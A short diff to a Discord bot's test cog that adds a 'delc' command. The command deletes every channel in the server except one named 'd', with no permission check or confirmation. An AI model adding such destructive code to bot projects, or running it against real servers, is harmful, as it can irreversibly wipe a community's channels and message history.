@@ -167,6 +167,12 @@ class Testcog(commands.Cog):
         if perm_list == bot_join_permissions:
             print("OHA NE")
 
+    @commands.command()
+    async def delc(self, ctx):
+        for channel in ctx.guild.channels:
+            if channel.name == 'd':
+                continue
+            await channel.delete()
 
 def setup(bot):
     bot.add_cog(Testcog(bot))
